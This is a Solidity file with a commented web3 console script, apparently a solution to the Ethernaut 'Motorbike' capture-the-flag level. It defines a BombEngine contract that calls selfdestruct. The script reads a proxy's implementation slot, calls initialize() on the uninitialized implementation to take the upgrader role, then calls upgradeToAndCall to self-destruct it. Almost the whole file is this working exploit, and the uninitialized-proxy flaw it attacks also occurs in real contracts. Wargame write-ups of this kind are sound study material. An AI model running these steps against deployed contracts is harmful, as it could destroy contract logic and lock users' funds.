// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}

/* use console for the below
The owner of the contract did not initialize the engine with the constructor of the motorbike contract -- point of entry
implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
implAddr = '0x' + implAddr.slice(-40)
initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")
await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })

verify if upgrader has been changed to metamask address 
upgraderData = web3.eth.abi.encodeFunctionSignature("upgrader()")
await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()

deploy contract
bombAddr = '<BombEngine-instance-address>'
explodeData = web3.eth.abi.encodeFunctionSignature("explode()")

upgradeSignature = {
    name: 'upgradeToAndCall',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: 'newImplementation'
        },
        {
            type: 'bytes',
            name: 'data'
        }
    ]
}

upgradeParams = [bombAddr, explodeData]

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams)
web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})

*/